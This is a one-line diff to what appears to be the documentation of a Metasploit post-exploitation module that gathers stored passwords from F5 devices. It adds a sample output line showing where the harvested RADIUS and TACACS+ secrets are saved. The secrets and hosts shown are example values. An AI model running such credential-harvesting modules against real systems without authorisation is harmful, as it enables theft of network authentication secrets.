@@ -66,6 +66,7 @@ msf6 post(linux/gather/f5_passwords) > run
 [+] Radius secret: secret2 (server: myradiustest2.example.org)
 [+] Radius secret: myradiussecret (server: myradiustest.example.org)
 [+] TACACS+ secret: mytacacspassword (server(s): mytacacsserver.example.org, mytacacsserver2.example.org)
+[+] Passwords stored in /home/ron/.msf4/loot/20221115101339_default_10.0.0.162_f5.service.passw_358656.txt
 [*] Post module execution completed
 [...]
 ```
